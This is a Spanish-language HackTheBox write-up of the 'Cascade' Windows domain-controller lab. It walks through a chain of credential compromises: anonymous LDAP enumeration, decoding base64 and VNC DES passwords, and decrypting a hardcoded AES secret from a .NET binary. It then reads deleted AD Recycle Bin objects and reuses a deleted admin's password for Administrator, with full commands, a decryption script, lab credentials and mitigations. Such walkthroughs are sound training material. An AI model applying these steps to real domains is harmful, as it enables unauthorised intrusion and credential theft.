@@ -1,0 +1,305 @@
+---
+title: "Cascade"
+platform: "HackTheBox"
+os: "Windows"
+difficulty: "Medium"
+date: 2026-10-18
+ports: ["53/dns", "88/kerberos", "135/rpc", "139/netbios", "389/ldap", "445/smb", "636/ldaps", "3268/gc", "3269/gc-ssl", "5985/winrm"]
+tags: ["active-directory", "ldap", "smb", "winrm", "vnc", "dotnet-reversing", "aes", "ad-recycle-bin", "credential-reuse"]
+summary: "DC de Windows Server 2008 R2 donde cada credencial desbloquea la siguiente: LDAP anónimo, un share oculto, descompilación de un binario .NET y el AD Recycle Bin, encadenados hasta reutilizar la contraseña de un usuario borrado y comprometer al Administrator."
+---
+
+Un DC de Windows Server 2008 R2 (dominio `cascade.local`) donde el nombre no es casual: es una **cascada** de secretos mal guardados. Cada credencial desbloquea la siguiente —LDAP anónimo, un share oculto, descompilación de .NET y el AD Recycle Bin— hasta reutilizar la contraseña de un usuario borrado para comprometer al Administrator.
+
+## Resumen de la cadena
+
+```text
+LDAP anónimo (cascadeLegacyPwd base64)
+   └─> r.thompson
+         └─> SMB share "Data" (VNC Install.reg)
+               └─> pass VNC (DES clave fija)  ──> s.smith
+                     └─> SMB share "Audit$" (CascAudit.exe + Audit.db)
+                           └─> AES clave fija en .NET  ──> arksvc
+                                 └─> grupo "AD Recycle Bin"
+                                       └─> objeto borrado TempAdmin (cascadeLegacyPwd base64)
+                                             └─> reutilización de pass ──> Administrator
+```
+
+## Reconocimiento
+
+### Nmap
+
+```bash
+nmap -p- --min-rate 5000 -oN allports.txt <IP>
+nmap -p 53,88,135,139,389,445,636,3268,3269,5985 -sCV -oN services.txt <IP>
+```
+
+Puertos abiertos relevantes:
+
+| Puerto | Servicio |
+|--------|----------|
+| 53 | DNS |
+| 88 | Kerberos |
+| 135 / 139 / 445 | RPC / NetBIOS / SMB |
+| 389 / 636 / 3268 / 3269 | LDAP / LDAPS / Global Catalog |
+| 5985 | WinRM |
+
+El combo Kerberos + LDAP + SMB + WinRM es la firma inequívoca de un **Domain Controller**. Añadimos el dominio a `/etc/hosts`:
+
+```bash
+echo "<IP> cascade.local CASC-DC1.cascade.local" | sudo tee -a /etc/hosts
+```
+
+## Enumeración LDAP → r.thompson
+
+Comprobamos si el **bind anónimo** está permitido:
+
+```bash
+ldapsearch -x -H ldap://cascade.local -s base namingcontexts
+# devuelve DC=cascade,DC=local → bind anónimo abierto
+```
+
+Volcamos los objetos usuario y leemos **todos** los atributos, no solo el `sAMAccountName`:
+
+```bash
+ldapsearch -x -H ldap://cascade.local -b "DC=cascade,DC=local" "(objectClass=user)"
+```
+
+Entre los atributos de `r.thompson` aparece uno **no estándar**:
+
+```text
+sAMAccountName: r.thompson
+cascadeLegacyPwd: clk0bjVldmE=
+```
+
+<Callout type="tip">
+`cascadeLegacyPwd` no es un atributo de AD: es custom, puesto a mano por un admin. **Siempre lee los atributos raros.**
+</Callout>
+
+El valor termina en `=` y es múltiplo de 4 → **base64**, que no es cifrado, es codificación reversible:
+
+```bash
+echo 'clk0bjVldmE=' | base64 -d
+# rY4n5eva
+```
+
+Credencial: `r.thompson : rY4n5eva`
+
+## r.thompson → share "Data"
+
+`r.thompson` no tiene WinRM, pero sí acceso SMB:
+
+```bash
+crackmapexec winrm cascade.local -u 'r.thompson' -p 'rY4n5eva'   # [-] sin acceso
+crackmapexec smb   cascade.local -u 'r.thompson' -p 'rY4n5eva' --shares
+```
+
+<Callout type="note">
+Autenticarse ≠ poder entrar por WinRM: hace falta pertenecer a *Remote Management Users*. Valida siempre con CME antes de pelearte con evil-winrm.
+</Callout>
+
+Share **`Data`** con permiso READ (no es estándar de un DC). Navegamos:
+
+```bash
+smbclient //cascade.local/Data -U 'cascade.local/r.thompson%rY4n5eva' -c 'recurse ON; ls'
+```
+
+Hallazgos clave en `\IT`:
+
+```text
+\IT\Temp\s.smith\VNC Install.reg
+\IT\Logs\DCs\dcdiag.log
+\IT\Email Archives\Meeting_Notes_June_2018.html
+\IT\Logs\Ark AD Recycle Bin   (← pista que cobra sentido al final)
+```
+
+## VNC password → s.smith
+
+El `.reg` es un export del registro de TightVNC en texto plano:
+
+```text
+"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+```
+
+8 bytes → VNC cifra con **DES y clave fija hardcodeada** (pública). Reversible al 100%.
+
+```bash
+echo -n '6bcf2a4b6e5aca0f' | xxd -r -p > vncpass.bin
+./vncpwd vncpass.bin
+# sT333ve2
+```
+
+<Callout type="tip">
+Patrón "clave fija embebida": aparece en VNC, routers y software legacy. Si está cifrado con una clave que viene en el propio binario, no es un secreto.
+</Callout>
+
+Validamos — y esta vez **sí** hay WinRM:
+
+```bash
+crackmapexec winrm cascade.local -u 's.smith' -p 'sT333ve2'   # (Pwn3d!)
+evil-winrm -i cascade.local -u 's.smith' -p 'sT333ve2'
+```
+
+**user.txt** capturada en `C:\Users\s.smith\Desktop\`.
+
+## Enumeración de s.smith → share "Audit$"
+
+```powershell
+whoami /all
+net user s.smith
+```
+
+Dos datos de oro:
+
+- Pertenece a **`CASCADE\Audit Share`** (acceso a un share que antes no teníamos).
+- Logon script custom: **`MapAuditDrive.vbs`**.
+
+<Callout type="note">
+`whoami /all` te da el token actual; `net user` te da la ficha completa (logon script, grupos). No son lo mismo.
+</Callout>
+
+Accedemos al share `Audit$`:
+
+```bash
+smbclient //cascade.local/Audit$ -U 'cascade.local/s.smith%sT333ve2' -c 'prompt OFF; recurse ON; mget *'
+```
+
+Contenido:
+
+```text
+CascAudit.exe            ← binario .NET custom
+CascCrypto.dll           ← DLL de cifrado custom
+DB\Audit.db              ← base de datos SQLite
+System.Data.SQLite.*     ← librerías públicas (ignorar)
+x64\ x86\ SQLite.Interop ← dependencias
+RunAudit.bat
+```
+
+<Callout type="note">
+Distingue lo **custom** (`CascAudit`, `CascCrypto`) de lo **público** (`System.Data.SQLite`). La lógica interesante vive en lo custom.
+</Callout>
+
+## Reversing .NET → arksvc
+
+### Extraer las strings Unicode
+
+.NET guarda strings en UTF-16, así que `strings` por defecto no las pilla. Hay que usar `-e l`:
+
+```bash
+strings -e l CascCrypto.dll | grep -iE 'key|iv'
+strings -e l CascAudit.exe  | grep -iE 'key|iv|select'
+```
+
+Resultado revelador:
+
+```text
+1tdyjCbY1Ix49842        ← IV   (16 bytes, en CascCrypto.dll / DefaultIV)
+c4scadek3y654321        ← Key  (16 bytes, en CascAudit.exe)
+SELECT * FROM LDAP      ← query de la BD
+AesCrypto               ← confirma AES-128-CBC
+```
+
+<Callout type="tip">
+`strings -e l` para binarios .NET (strings Unicode UTF-16). Dos strings de exactamente 16 caracteres = AES-128 (Key + IV). Para entender *cómo* se combinan, descompila con `ilspycmd` o dnSpy en una VM Windows.
+</Callout>
+
+### Leer la base de datos
+
+```bash
+file Audit.db   # SQLite 3.x database
+sqlite3 Audit.db "SELECT * FROM LDAP;"
+# 1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
+```
+
+### Descifrar la contraseña (AES-128-CBC)
+
+```python
+from Crypto.Cipher import AES
+import base64
+
+key = b'c4scadek3y654321'
+iv  = b'1tdyjCbY1Ix49842'
+enc = base64.b64decode('BQO5l5Kj9MdErXx6Q6AGOw==')
+
+cipher = AES.new(key, AES.MODE_CBC, iv)
+pt = cipher.decrypt(enc)
+print(pt[:-pt[-1]].decode('utf-8', errors='ignore'))
+# w3lc0meFr31nd
+```
+
+Validamos:
+
+```bash
+crackmapexec winrm cascade.local -u 'arksvc' -p 'w3lc0meFr31nd'   # (Pwn3d!)
+evil-winrm -i cascade.local -u 'arksvc' -p 'w3lc0meFr31nd'
+```
+
+## AD Recycle Bin → TempAdmin → Administrator
+
+```powershell
+whoami /all
+# CASCADE\AD Recycle Bin   ← el superpoder
+```
+
+El grupo **AD Recycle Bin** permite leer objetos **eliminados** del dominio. Cuando se borra un objeto en AD, queda como tombstone conservando sus atributos.
+
+```powershell
+Get-ADObject -Filter 'isDeleted -eq $True -and name -ne "Deleted Objects"' `
+  -IncludeDeletedObjects -Properties * | Select-Object name,objectClass
+```
+
+Aparece un usuario borrado: **`TempAdmin`**. Sacamos todos sus atributos:
+
+```powershell
+Get-ADObject -Filter 'samAccountName -eq "TempAdmin"' -IncludeDeletedObjects -Properties *
+```
+
+Y cierra el círculo — el mismo truco del principio:
+
+```text
+cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz
+```
+
+```bash
+echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
+# baCT3r1aN00dles
+```
+
+### El último giro: credenciales reutilizadas
+
+`TempAdmin` está borrado → no se puede autenticar:
+
+```bash
+crackmapexec winrm cascade.local -u 'TempAdmin' -p 'baCT3r1aN00dles'   # [-] cuenta inexistente
+```
+
+Pero su nombre ("admin temporal") sugiere **reutilización de pass** con el Administrator real:
+
+```bash
+crackmapexec winrm cascade.local -u 'administrator' -p 'baCT3r1aN00dles'   # (Pwn3d!)
+evil-winrm -i cascade.local -u 'administrator' -p 'baCT3r1aN00dles'
+```
+
+```powershell
+type C:\Users\Administrator\Desktop\root.txt
+```
+
+**Cascade comprometida.**
+
+## Lecciones aprendidas
+
+1. **Lee todos los atributos LDAP**, no solo los obvios. Los campos custom (`cascadeLegacyPwd`) son donde se esconden los secretos.
+2. **Base64 no es cifrado.** Reconoce encodings de un vistazo (`=` final, longitud múltiplo de 4).
+3. **Clave fija embebida = secreto falso.** VNC (DES) y el `.dll` custom (AES) son la misma idea: la clave viaja con el binario.
+4. **`strings -e l`** para binarios .NET (strings Unicode UTF-16).
+5. **Distingue custom de público** al analizar un conjunto de ficheros.
+6. **AD Recycle Bin** conserva objetos borrados con sus atributos — un vector de privesc real.
+7. **Reutilización de credenciales**: una contraseña encontrada en un sitio vale la pena probarla en todas las cuentas.
+
+## Mitigaciones
+
+- No almacenar contraseñas en atributos de AD, el registro ni bases de datos locales.
+- Deshabilitar el bind anónimo de LDAP.
+- No reutilizar contraseñas entre cuentas (menos aún con el Administrator).
+- Purgar objetos del AD Recycle Bin que contengan datos sensibles.
+- No hardcodear claves de cifrado en binarios distribuidos.
